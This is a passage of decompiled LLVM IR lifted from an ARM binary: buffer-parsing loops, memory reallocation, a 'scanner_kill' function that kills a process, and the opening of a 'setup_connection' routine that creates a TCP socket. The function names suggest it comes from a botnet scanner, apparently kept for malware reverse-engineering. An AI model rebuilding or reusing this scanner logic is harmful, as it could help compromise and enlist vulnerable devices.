  %v0_e6a046 = phi i32 [ %v3_e68c, %dec_label_pc_e684.backedge ], [ %v3_e68c22, %dec_label_pc_e678 ]
  %v0_e69c44 = phi i32 [ %v1_e75c, %dec_label_pc_e684.backedge ], [ %v0_e6c8143, %dec_label_pc_e678 ]
  %v0_e69442 = phi i32 [ %v3_e684, %dec_label_pc_e684.backedge ], [ %v3_e68420, %dec_label_pc_e678 ]
  br label %dec_label_pc_e694

dec_label_pc_e694:                                ; preds = %dec_label_pc_e694.preheader, %dec_label_pc_e69c
  %v0_e758 = phi i32 [ %v0_e75848, %dec_label_pc_e694.preheader ], [ 1, %dec_label_pc_e69c ]
  %v0_e6a0 = phi i32 [ %v0_e6a046, %dec_label_pc_e694.preheader ], [ %v3_e6b8, %dec_label_pc_e69c ]
  %v0_e75c = phi i32 [ %v0_e69c44, %dec_label_pc_e694.preheader ], [ %v2_e6a8, %dec_label_pc_e69c ]
  %v0_e694 = phi i32 [ %v0_e69442, %dec_label_pc_e694.preheader ], [ %v3_e6ac, %dec_label_pc_e69c ]
  %v7_e694 = icmp eq i32 %v0_e694, 191
  store i1 %v7_e694, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v0_e694, 192
  br i1 %tmp, label %dec_label_pc_e758, label %dec_label_pc_e69c

dec_label_pc_e69c:                                ; preds = %dec_label_pc_e694
  %v1_e69c = add i32 %v0_e75c, 1
  %v2_e69c = inttoptr i32 %v1_e69c to i8*
  %v3_e69c = load i8, i8* %v2_e69c, align 1
  %v4_e69c = zext i8 %v3_e69c to i32
  %v2_e6a0 = or i32 %v4_e69c, -49152
  %v0_e6a8 = load i32, i32* @r5, align 4
  %v1_e6a4 = add i32 %v0_e6a8, %v0_e6a0
  %v2_e6a8 = add i32 %v1_e6a4, %v2_e6a0
  store i32 %v2_e6a8, i32* %r3.global-to-local, align 4
  %v1_e6ac = inttoptr i32 %v2_e6a8 to i8*
  %v2_e6ac = load i8, i8* %v1_e6ac, align 1
  %v3_e6ac = zext i8 %v2_e6ac to i32
  store i32 %v3_e6ac, i32* %r2.global-to-local, align 4
  %v2_e6b0 = icmp eq i8 %v2_e6ac, 0
  store i1 %v2_e6b0, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v3_e6b8 = mul nuw nsw i32 %v3_e6ac, 256
  store i32 %v3_e6b8, i32* @r1, align 4
  br i1 %v2_e6b0, label %dec_label_pc_e6c0, label %dec_label_pc_e694

dec_label_pc_e6c0:                                ; preds = %dec_label_pc_e684.backedge, %dec_label_pc_e69c, %dec_label_pc_e678
  %v1_e6c4 = phi i32 [ 1, %dec_label_pc_e678 ], [ %v1_e760, %dec_label_pc_e69c ], [ %v1_e76050, %dec_label_pc_e684.backedge ]
  %v0_e6c0 = phi i32 [ 0, %dec_label_pc_e678 ], [ 1, %dec_label_pc_e69c ], [ %v0_e758, %dec_label_pc_e684.backedge ]
  %v7_e6c0 = icmp eq i32 %v0_e6c0, 1
  store i1 %v7_e6c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6c0, label %bb119, label %bb120

bb119:                                            ; preds = %dec_label_pc_e6c0
  %v2_e6c4 = add i32 %v1_e6c4, 1
  store i32 %v2_e6c4, i32* %ip.global-to-local, align 4
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_e6c0, %bb119
  %v1_e6c8 = phi i32 [ %v1_e6c4, %dec_label_pc_e6c0 ], [ %v2_e6c4, %bb119 ]
  %v2_e6c8 = add i32 %v1_e6c8, %v0_e6c8143
  store i32 %v2_e6c8, i32* @r4, align 4
  %v3_e6cc = inttoptr i32 %v2_e6c8 to i8*
  %v4_e6cc = load i8, i8* %v3_e6cc, align 1
  %v6_e6cc = zext i8 %v4_e6cc to i32
  store i32 %v6_e6cc, i32* %r3.global-to-local, align 4
  %v1_e6d0 = add i32 %v2_e6c8, 1
  %v2_e6d0 = inttoptr i32 %v1_e6d0 to i8*
  %v3_e6d0 = load i8, i8* %v2_e6d0, align 1
  %v4_e6d0 = zext i8 %v3_e6d0 to i32
  store i32 %v4_e6d0, i32* %r2.global-to-local, align 4
  %v4_e6d4 = mul nuw nsw i32 %v4_e6d0, 256
  %v5_e6d4 = or i32 %v4_e6d4, %v6_e6cc
  store i32 %v5_e6d4, i32* %r3.global-to-local, align 4
  %v7_e6d8 = icmp eq i32 %v5_e6d4, 256
  store i1 %v7_e6d8, i1* %cpsr_z.global-to-local, align 1
  %v1_e6dc = add i32 %v2_e6c8, 10
  store i32 %v1_e6dc, i32* @r7, align 4
  br i1 %v7_e6d8, label %dec_label_pc_e778, label %dec_label_pc_e6e4

dec_label_pc_e6e4:                                ; preds = %dec_label_pc_e778, %bb120
  store i32 %v1_e6dc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e6f024 = inttoptr i32 %v1_e6dc to i8*
  %v2_e6f025 = load i8, i8* %v1_e6f024, align 1
  %v3_e6f026 = zext i8 %v2_e6f025 to i32
  store i32 %v3_e6f026, i32* %r2.global-to-local, align 4
  %v2_e6f427 = icmp eq i8 %v2_e6f025, 0
  store i1 %v2_e6f427, i1* %cpsr_z.global-to-local, align 1
  %v3_e6f828 = mul nuw nsw i32 %v3_e6f026, 256
  store i32 %v3_e6f828, i32* @r1, align 4
  br i1 %v2_e6f427, label %dec_label_pc_e72c, label %dec_label_pc_e700.preheader

dec_label_pc_e700.preheader:                      ; preds = %dec_label_pc_e6e4, %dec_label_pc_e6f0.backedge
  %v1_e770 = phi i32 [ %v1_e77065, %dec_label_pc_e6f0.backedge ], [ 1, %dec_label_pc_e6e4 ]
  %v0_e76863 = phi i32 [ %v0_e768, %dec_label_pc_e6f0.backedge ], [ 0, %dec_label_pc_e6e4 ]
  %v0_e70c61 = phi i32 [ %v3_e6f8, %dec_label_pc_e6f0.backedge ], [ %v3_e6f828, %dec_label_pc_e6e4 ]
  %v0_e70859 = phi i32 [ %v1_e76c, %dec_label_pc_e6f0.backedge ], [ %v1_e6dc, %dec_label_pc_e6e4 ]
  %v0_e70057 = phi i32 [ %v3_e6f0, %dec_label_pc_e6f0.backedge ], [ %v3_e6f026, %dec_label_pc_e6e4 ]
  br label %dec_label_pc_e700

dec_label_pc_e700:                                ; preds = %dec_label_pc_e700.preheader, %dec_label_pc_e708
  %v0_e768 = phi i32 [ %v0_e76863, %dec_label_pc_e700.preheader ], [ 1, %dec_label_pc_e708 ]
  %v0_e70c = phi i32 [ %v0_e70c61, %dec_label_pc_e700.preheader ], [ %v3_e724, %dec_label_pc_e708 ]
  %v0_e76c = phi i32 [ %v0_e70859, %dec_label_pc_e700.preheader ], [ %v2_e714, %dec_label_pc_e708 ]
  %v0_e700 = phi i32 [ %v0_e70057, %dec_label_pc_e700.preheader ], [ %v3_e718, %dec_label_pc_e708 ]
  %v7_e700 = icmp eq i32 %v0_e700, 191
  store i1 %v7_e700, i1* %cpsr_z.global-to-local, align 1
  %tmp159 = icmp ult i32 %v0_e700, 192
  br i1 %tmp159, label %dec_label_pc_e768, label %dec_label_pc_e708

dec_label_pc_e708:                                ; preds = %dec_label_pc_e700
  %v1_e708 = add i32 %v0_e76c, 1
  %v2_e708 = inttoptr i32 %v1_e708 to i8*
  %v3_e708 = load i8, i8* %v2_e708, align 1
  %v4_e708 = zext i8 %v3_e708 to i32
  %v2_e70c = or i32 %v4_e708, -49152
  %v0_e714 = load i32, i32* @r5, align 4
  %v1_e710 = add i32 %v0_e714, %v0_e70c
  %v2_e714 = add i32 %v1_e710, %v2_e70c
  store i32 %v2_e714, i32* %r3.global-to-local, align 4
  %v1_e718 = inttoptr i32 %v2_e714 to i8*
  %v2_e718 = load i8, i8* %v1_e718, align 1
  %v3_e718 = zext i8 %v2_e718 to i32
  store i32 %v3_e718, i32* %r2.global-to-local, align 4
  %v2_e71c = icmp eq i8 %v2_e718, 0
  store i1 %v2_e71c, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_e724 = mul nuw nsw i32 %v3_e718, 256
  store i32 %v3_e724, i32* @r1, align 4
  br i1 %v2_e71c, label %dec_label_pc_e72c, label %dec_label_pc_e700

dec_label_pc_e72c:                                ; preds = %dec_label_pc_e6f0.backedge, %dec_label_pc_e708, %dec_label_pc_e6e4
  %v1_e730 = phi i32 [ 1, %dec_label_pc_e6e4 ], [ %v1_e770, %dec_label_pc_e708 ], [ %v1_e77065, %dec_label_pc_e6f0.backedge ]
  %v0_e72c = phi i32 [ 0, %dec_label_pc_e6e4 ], [ 1, %dec_label_pc_e708 ], [ %v0_e768, %dec_label_pc_e6f0.backedge ]
  %v7_e72c = icmp eq i32 %v0_e72c, 1
  store i1 %v7_e72c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e72c, label %bb121, label %bb122

bb121:                                            ; preds = %dec_label_pc_e72c
  %v2_e730 = add i32 %v1_e730, 1
  store i32 %v2_e730, i32* %r0.global-to-local, align 4
  br label %bb122

bb122:                                            ; preds = %dec_label_pc_e78c, %dec_label_pc_e72c, %bb121
  %v1_e734 = phi i32 [ %v5_e7a4, %dec_label_pc_e78c ], [ %v1_e730, %dec_label_pc_e72c ], [ %v2_e730, %bb121 ]
  %v2_e734 = add i32 %v1_e734, %v1_e6dc
  br label %dec_label_pc_e664.backedge

dec_label_pc_e664.backedge:                       ; preds = %bb122, %dec_label_pc_e7b0
  %v0_e664.pre = phi i32 [ %v3_e670144, %bb122 ], [ %v0_e664.pre.pre, %dec_label_pc_e7b0 ]
  %storemerge29 = phi i32 [ %v2_e734, %bb122 ], [ %v2_e828, %dec_label_pc_e7b0 ]
  store i32 %storemerge29, i32* %r0.global-to-local, align 4
  %v1_e664 = add i32 %v0_e664.pre, -1
  %v3_e668 = mul i32 %v1_e664, 65536
  store i32 %v3_e668, i32* %r3.global-to-local, align 4
  %v7_e66c = icmp eq i32 %v3_e668, -65536
  store i1 %v7_e66c, i1* %cpsr_z.global-to-local, align 1
  %v3_e670 = urem i32 %v1_e664, 65536
  store i32 %v3_e670, i32* @r8, align 4
  br i1 %v7_e66c, label %dec_label_pc_e5ec, label %dec_label_pc_e678

dec_label_pc_e73c:                                ; preds = %dec_label_pc_e5ec
  %v1_e73c = add i32 %v0_e5f4, 4
  %v2_e73c = inttoptr i32 %v1_e73c to i32*
  %v3_e73c = load i32, i32* %v2_e73c, align 4
  store i32 %v3_e73c, i32* %r0.global-to-local, align 4
  %v2_e740 = icmp eq i32 %v3_e73c, 0
  store i1 %v2_e740, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_e748.138 to i32), i32* @lr, align 4
  %v1_e744 = xor i1 %v2_e740, true
  call void @__pseudo_cond_branch(i1 %v1_e744, i32 ptrtoint (i32* @global_var_1310c.34 to i32))
  %v0_e748 = load i32, i32* @fp, align 4
  store i32 %v0_e748, i32* @r0, align 4
  %v0_e74c = call i32 @free()
  store i32 %v0_e74c, i32* %r0.global-to-local, align 4
  %v0_e750 = load i32, i32* @r4, align 4
  br label %dec_label_pc_e600

dec_label_pc_e758:                                ; preds = %dec_label_pc_e694
  %v2_e758 = icmp eq i32 %v0_e758, 0
  store i1 %v2_e758, i1* %cpsr_z.global-to-local, align 1
  %v1_e75c = add i32 %v0_e75c, 1
  store i32 %v1_e75c, i32* %r3.global-to-local, align 4
  br i1 %v2_e758, label %bb123, label %dec_label_pc_e684.backedge

dec_label_pc_e684.backedge:                       ; preds = %dec_label_pc_e758, %bb123
  %v1_e76050 = phi i32 [ %v1_e760, %dec_label_pc_e758 ], [ %v2_e760, %bb123 ]
  %v1_e684 = inttoptr i32 %v1_e75c to i8*
  %v2_e684 = load i8, i8* %v1_e684, align 1
  %v3_e684 = zext i8 %v2_e684 to i32
  store i32 %v3_e684, i32* %r2.global-to-local, align 4
  %v2_e688 = icmp eq i8 %v2_e684, 0
  store i1 %v2_e688, i1* %cpsr_z.global-to-local, align 1
  %v3_e68c = mul nuw nsw i32 %v3_e684, 256
  store i32 %v3_e68c, i32* @r1, align 4
  br i1 %v2_e688, label %dec_label_pc_e6c0, label %dec_label_pc_e694.preheader

bb123:                                            ; preds = %dec_label_pc_e758
  %v2_e760 = add i32 %v1_e760, 1
  store i32 %v2_e760, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e684.backedge

dec_label_pc_e768:                                ; preds = %dec_label_pc_e700
  %v2_e768 = icmp eq i32 %v0_e768, 0
  store i1 %v2_e768, i1* %cpsr_z.global-to-local, align 1
  %v1_e76c = add i32 %v0_e76c, 1
  store i32 %v1_e76c, i32* %r3.global-to-local, align 4
  br i1 %v2_e768, label %bb124, label %dec_label_pc_e6f0.backedge

dec_label_pc_e6f0.backedge:                       ; preds = %dec_label_pc_e768, %bb124
  %v1_e77065 = phi i32 [ %v1_e770, %dec_label_pc_e768 ], [ %v2_e770, %bb124 ]
  %v1_e6f0 = inttoptr i32 %v1_e76c to i8*
  %v2_e6f0 = load i8, i8* %v1_e6f0, align 1
  %v3_e6f0 = zext i8 %v2_e6f0 to i32
  store i32 %v3_e6f0, i32* %r2.global-to-local, align 4
  %v2_e6f4 = icmp eq i8 %v2_e6f0, 0
  store i1 %v2_e6f4, i1* %cpsr_z.global-to-local, align 1
  %v3_e6f8 = mul nuw nsw i32 %v3_e6f0, 256
  store i32 %v3_e6f8, i32* @r1, align 4
  br i1 %v2_e6f4, label %dec_label_pc_e72c, label %dec_label_pc_e700.preheader

bb124:                                            ; preds = %dec_label_pc_e768
  %v2_e770 = add i32 %v1_e770, 1
  store i32 %v2_e770, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e6f0.backedge

dec_label_pc_e778:                                ; preds = %bb120
  %v1_e778 = add i32 %v2_e6c8, 2
  %v2_e778 = inttoptr i32 %v1_e778 to i8*
  %v3_e778 = load i8, i8* %v2_e778, align 1
  %v4_e778 = zext i8 %v3_e778 to i32
  store i32 %v4_e778, i32* %r3.global-to-local, align 4
  %v1_e77c = add i32 %v2_e6c8, 3
  %v2_e77c = inttoptr i32 %v1_e77c to i8*
  %v3_e77c = load i8, i8* %v2_e77c, align 1
  %v4_e77c = zext i8 %v3_e77c to i32
  store i32 %v4_e77c, i32* %r2.global-to-local, align 4
  %v4_e780 = mul nuw nsw i32 %v4_e77c, 256
  %v5_e780 = or i32 %v4_e780, %v4_e778
  store i32 %v5_e780, i32* %r3.global-to-local, align 4
  %v7_e784 = icmp eq i32 %v5_e780, 256
  store i1 %v7_e784, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e784, label %dec_label_pc_e78c, label %dec_label_pc_e6e4

dec_label_pc_e78c:                                ; preds = %dec_label_pc_e778
  %v1_e78c = add i32 %v2_e6c8, 9
  %v2_e78c = inttoptr i32 %v1_e78c to i8*
  %v3_e78c = load i8, i8* %v2_e78c, align 1
  %v4_e78c = zext i8 %v3_e78c to i32
  store i32 %v4_e78c, i32* %r2.global-to-local, align 4
  %v1_e790 = add i32 %v2_e6c8, 8
  %v2_e790 = inttoptr i32 %v1_e790 to i8*
  %v3_e790 = load i8, i8* %v2_e790, align 1
  %v4_e790 = zext i8 %v3_e790 to i32
  %v4_e794 = mul nuw nsw i32 %v4_e78c, 256
  %v5_e794 = or i32 %v4_e790, %v4_e794
  %v3_e798 = mul i32 %v5_e794, 65536
  store i32 %v3_e798, i32* %r3.global-to-local, align 4
  %v3_e79c = mul nuw nsw i32 %v4_e790, 256
  store i32 %v3_e79c, i32* %r2.global-to-local, align 4
  %v5_e7a4 = or i32 %v3_e79c, %v4_e78c
  store i32 %v5_e7a4, i32* %r0.global-to-local, align 4
  %v7_e7a8 = icmp eq i32 %v5_e7a4, 4
  store i1 %v7_e7a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7a8, label %dec_label_pc_e7b0, label %bb122

dec_label_pc_e7b0:                                ; preds = %dec_label_pc_e78c
  %v2_e7b0 = inttoptr i32 %v1_e6dc to i8*
  %v3_e7b0 = load i8, i8* %v2_e7b0, align 1
  %v4_e7b0 = zext i8 %v3_e7b0 to i32
  store i32 %v4_e7b0, i32* %r3.global-to-local, align 4
  store i32 %v2_e3c0, i32* %r2.global-to-local, align 4
  %v1_e7bc = add i32 %v2_e6c8, 11
  %v2_e7bc = inttoptr i32 %v1_e7bc to i8*
  %v3_e7bc = load i8, i8* %v2_e7bc, align 1
  %v4_e7bc = zext i8 %v3_e7bc to i32
  store i32 %v4_e7bc, i32* %r2.global-to-local, align 4
  store i32 %v2_e3c0, i32* %r3.global-to-local, align 4
  %v1_e7c8 = add i32 %v2_e6c8, 12
  %v2_e7c8 = inttoptr i32 %v1_e7c8 to i8*
  %v3_e7c8 = load i8, i8* %v2_e7c8, align 1
  %v4_e7c8 = zext i8 %v3_e7c8 to i32
  store i32 %v4_e7c8, i32* %r3.global-to-local, align 4
  store i32 %v2_e3c0, i32* %ip.global-to-local, align 4
  %v1_e7d4 = add i32 %v2_e6c8, 13
  %v2_e7d4 = inttoptr i32 %v1_e7d4 to i8*
  %v3_e7d4 = load i8, i8* %v2_e7d4, align 1
  %v4_e7d4 = zext i8 %v3_e7d4 to i32
  store i32 %v4_e7d4, i32* %r2.global-to-local, align 4
  %v0_e7dc = load i32, i32* @fp, align 4
  %v1_e7dc = inttoptr i32 %v0_e7dc to i8*
  %v2_e7dc = load i8, i8* %v1_e7dc, align 1
  %v3_e7dc = zext i8 %v2_e7dc to i32
  %v1_e7e0 = mul nuw nsw i32 %v3_e7dc, 4
  %v3_e7e4 = add nuw nsw i32 %v1_e7e0, 4
  store i32 %v3_e7e4, i32* %r1.global-to-local, align 4
  %v1_e7e8 = add i32 %v0_e7dc, 4
  %v2_e7e8 = inttoptr i32 %v1_e7e8 to i32*
  %v3_e7e8 = load i32, i32* %v2_e7e8, align 4
  store i32 %v3_e7e8, i32* %r0.global-to-local, align 4
  %v3_e7ec = sext i8 %v3_e7d4 to i32
  %v5_e7ec = sext i8 %v3_e7c8 to i32
  %v10_e7ec = inttoptr i32 %v3_e7e8 to i32*
  %v11_e7ec = call i32 @realloc(i32* %v10_e7ec, i32 %v3_e7e4, i32 %v3_e7ec, i32 %v5_e7ec)
  store i32 %v11_e7ec, i32* %r0.global-to-local, align 4
  %v0_e7f0 = load i32, i32* @fp, align 4
  %v1_e7f0 = inttoptr i32 %v0_e7f0 to i8*
  %v2_e7f0 = load i8, i8* %v1_e7f0, align 1
  %v3_e7f0 = zext i8 %v2_e7f0 to i32
  store i32 %v3_e7f0, i32* %r2.global-to-local, align 4
  store i32 %v2_e3c0, i32* @lr, align 4
  %v4_e7f8 = sext i8 %v3_e7b0 to i32
  store i32 %v4_e7f8, i32* %r3.global-to-local, align 4
  %v1_e7fc = add nuw nsw i32 %v3_e7f0, 1
  store i32 %v1_e7fc, i32* @r1, align 4
  %v5_e800 = mul nuw nsw i32 %v3_e7f0, 4
  %v6_e800 = add i32 %v5_e800, %v11_e7ec
  %v7_e800 = inttoptr i32 %v6_e800 to i32*
  store i32 %v4_e7f8, i32* %v7_e800, align 4
  %v1_e804 = load i32, i32* @fp, align 4
  %v2_e804 = add i32 %v1_e804, 4
  %v3_e804 = inttoptr i32 %v2_e804 to i32*
  store i32 %v11_e7ec, i32* %v3_e804, align 4
  %v0_e808 = load i32, i32* @r1, align 4
  %v1_e808 = trunc i32 %v0_e808 to i8
  %v2_e808 = load i32, i32* @fp, align 4
  %v3_e808 = inttoptr i32 %v2_e808 to i8*
  store i8 %v1_e808, i8* %v3_e808, align 1
  %v0_e80c = load i32, i32* @r4, align 4
  %v1_e80c = add i32 %v0_e80c, 9
  %v2_e80c = inttoptr i32 %v1_e80c to i8*
  %v3_e80c = load i8, i8* %v2_e80c, align 1
  %v4_e80c = zext i8 %v3_e80c to i32
  store i32 %v4_e80c, i32* %r3.global-to-local, align 4
  %v1_e810 = add i32 %v0_e80c, 8
  %v2_e810 = inttoptr i32 %v1_e810 to i8*
  %v3_e810 = load i8, i8* %v2_e810, align 1
  %v4_e810 = zext i8 %v3_e810 to i32
  %v4_e814 = mul nuw nsw i32 %v4_e80c, 256
  %v5_e814 = or i32 %v4_e810, %v4_e814
  %v3_e818 = mul i32 %v5_e814, 65536
  store i32 %v3_e818, i32* %r2.global-to-local, align 4
  %v3_e81c = mul nuw nsw i32 %v4_e810, 256
  store i32 %v3_e81c, i32* %r3.global-to-local, align 4
  %v5_e824 = or i32 %v3_e81c, %v4_e80c
  store i32 %v5_e824, i32* %r0.global-to-local, align 4
  %v0_e828 = load i32, i32* @r7, align 4
  %v2_e828 = add i32 %v0_e828, %v5_e824
  %v0_e664.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_e664.backedge

; uselistorder directives
  uselistorder i32 %v3_e81c, { 1, 0 }
  uselistorder i32 %v4_e80c, { 1, 0, 2 }
  uselistorder i32 %v11_e7ec, { 1, 0, 2 }
  uselistorder i32 %v3_e7e4, { 1, 0 }
  uselistorder i32 %v5_e7a4, { 1, 2, 0 }
  uselistorder i32 %v3_e79c, { 1, 0 }
  uselistorder i32 %v4_e78c, { 1, 0, 2 }
  uselistorder i32 %v2_e770, { 1, 0 }
  uselistorder i32 %v3_e6f0, { 0, 2, 1 }
  uselistorder i32 %v1_e77065, { 1, 0 }
  uselistorder i32 %v1_e76c, { 1, 2, 0 }
  uselistorder i32 %v2_e760, { 1, 0 }
  uselistorder i32 %v3_e684, { 0, 2, 1 }
  uselistorder i32 %v1_e76050, { 1, 0 }
  uselistorder i32 %v1_e75c, { 1, 2, 0 }
  uselistorder i1 %v7_e66c, { 1, 0 }
  uselistorder i32 %v1_e664, { 1, 0 }
  uselistorder i32 %storemerge29, { 1, 0 }
  uselistorder i32 %v3_e718, { 0, 2, 1 }
  uselistorder i32 %v2_e714, { 1, 2, 0 }
  uselistorder i32 %v0_e768, { 2, 0, 1 }
  uselistorder i32 %v1_e770, { 1, 2, 0 }
  uselistorder i32 %v3_e6f828, { 1, 0 }
  uselistorder i32 %v3_e6f026, { 1, 0, 2 }
  uselistorder i32 %v1_e6dc, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v2_e6c8, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_e6ac, { 0, 2, 1 }
  uselistorder i32 %v2_e6a8, { 1, 2, 0 }
  uselistorder i32 %v0_e758, { 2, 0, 1 }
  uselistorder i32 %v1_e760, { 1, 2, 0 }
  uselistorder i32 %v3_e68c22, { 1, 0 }
  uselistorder i32 %v3_e68420, { 1, 0, 2 }
  uselistorder i32 %v0_e6c8143, { 3, 0, 1, 2 }
  uselistorder i32 %v3_e670142, { 1, 0 }
  uselistorder i1 %v7_e66c141, { 1, 0 }
  uselistorder i32 %v1_e664134, { 1, 0 }
  uselistorder i1 %v9_e640, { 1, 0 }
  uselistorder i32 %v0_e600, { 1, 0 }
  uselistorder i32 %v0_e5f4, { 1, 0, 2 }
  uselistorder i32 %v0_e5e4, { 1, 0 }
  uselistorder i32 %v0_e5bc, { 1, 0 }
  uselistorder i32 %v1_e570, { 1, 0, 2 }
  uselistorder i1 %v7_e568, { 1, 0 }
  uselistorder i32 %v5_e564, { 1, 0, 2 }
  uselistorder i32 %v1_e52c, { 1, 0 }
  uselistorder i32 %v3_e518, { 1, 0 }
  uselistorder i32 %v0_e510, { 1, 0 }
  uselistorder i32 %v1_e504, { 1, 2, 0 }
  uselistorder i1 %v7_e4bc, { 1, 0 }
  uselistorder i32 %v4_e4b8, { 1, 0, 2 }
  uselistorder i1 %v7_e4a0, { 1, 0 }
  uselistorder i32 %v3_e49c, { 1, 0, 2 }
  uselistorder i1 %v7_e484, { 1, 0 }
  uselistorder i32 %v3_e480, { 2, 1, 0, 3 }
  uselistorder i1 %v7_e468, { 2, 1, 0 }
  uselistorder i32 %v1_e46c, { 1, 0 }
  uselistorder i32 %v2_e51c, { 1, 0 }
  uselistorder i32 %v2_e4f4, { 1, 0, 2 }
  uselistorder i16 %v5_e410, { 1, 0 }
  uselistorder i32 %v2_e40c, { 1, 0, 2 }
  uselistorder i32 %v6_e3f8, { 1, 2, 0 }
  uselistorder i64 %v5_e3f4, { 0, 2, 1 }
  uselistorder i32 %v1_e3e0, { 1, 0, 2 }
  uselistorder i32 %v1_e398, { 1, 0 }
  uselistorder i32 %v1_e394, { 1, 2, 0 }
  uselistorder i32 %v2_e390, { 1, 0 }
  uselistorder i1 %v8_e37c, { 1, 0 }
  uselistorder i32 %v2_e354, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2244, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i16* %stack_var_-4292, { 1, 0 }
  uselistorder i16 %tmp79, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 4, 1, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 11, 14, 12, 13, 15, 17, 36, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 33, 34, 37 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 12, 8, 27, 10, 11, 26, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 10 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 8, 7, 9, 10, 12, 15, 13, 14, 17, 16, 20, 18, 19, 21, 22, 24, 23, 26, 25, 27, 29, 28, 30, 33, 32, 31, 34, 35, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 9, 3, 14, 4, 5, 15, 6, 7, 8, 35, 10, 11, 12, 13, 34, 36, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26, 27, 28, 33, 30, 31, 29, 32, 37 }
  uselistorder i32 (i32)* @sleep, { 11, 10, 9, 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e6f0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e684.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e664.backedge, { 1, 0 }
  uselistorder label %bb122, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e700, { 1, 0 }
  uselistorder label %dec_label_pc_e700.preheader, { 1, 0 }
  uselistorder label %bb120, { 1, 0 }
  uselistorder label %dec_label_pc_e694, { 1, 0 }
  uselistorder label %dec_label_pc_e694.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e678, { 1, 0 }
  uselistorder label %dec_label_pc_e600, { 1, 0 }
  uselistorder label %dec_label_pc_e5ec, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_e5cc, { 2, 1, 4, 0, 3 }
  uselistorder label %bb118, { 1, 0 }
  uselistorder label %bb115, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_e374, { 1, 0 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e83c = load i32, i32* @global_var_24a70.140, align 4
  %v2_e844 = call i32 @kill(i32 %v2_e83c, i32 9)
  ret i32 %v2_e844

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e858 = load i32, i32* @r4, align 4
  store i32 %v3_e858, i32* %stack_var_-16, align 4
  %v6_e858 = load i32, i32* @r5, align 4
  %v9_e858 = load i32, i32* @r6, align 4
  %v12_e858 = load i32, i32* @lr, align 4
  %v0_e85c = load i32, i32* @r0, align 4
  store i32 %v0_e85c, i32* @r5, align 4
  %v1_e860 = add i32 %v0_e85c, 4
  %v2_e860 = inttoptr i32 %v1_e860 to i32*
  %v3_e860 = load i32, i32* %v2_e860, align 4
  store i32 %v3_e860, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 59524, i32* @lr, align 4
  %v1_e880 = icmp ne i32 %v3_e860, -1
  call void @__pseudo_cond_branch(i1 %v1_e880, i32 ptrtoint (i32* @global_var_145e0.112 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_e88c = load i32, i32* @r6, align 4
  store i32 %v0_e88c, i32* %r2.global-to-local, align 4
  %v3_e890 = call i32 @socket(i32 2, i32 1, i32 %v0_e88c)
  store i32 %v3_e890, i32* %r0.global-to-local, align 4
  %v7_e894 = icmp eq i32 %v3_e890, -1
  %v1_e898 = load i32, i32* @r5, align 4
  %v2_e898 = add i32 %v1_e898, 4
  %v3_e898 = inttoptr i32 %v2_e898 to i32*
  store i32 %v3_e890, i32* %v3_e898, align 4
  br i1 %v7_e894, label %entry.dec_label_pc_e910_crit_edge, label %dec_label_pc_e8a0

entry.dec_label_pc_e910_crit_edge:                ; preds = %entry
  %v1_e918.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e910

dec_label_pc_e8a0:                                ; preds = %entry
  %v2_e864 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e8a0 = load i32, i32* @r5, align 4
  %v1_e8a0 = add i32 %v0_e8a0, 28
  store i32 %v1_e8a0, i32* @r0, align 4
  %v0_e8a4 = load i32, i32* @r6, align 4
  %v2_e8a4 = add i32 %v0_e8a0, 24
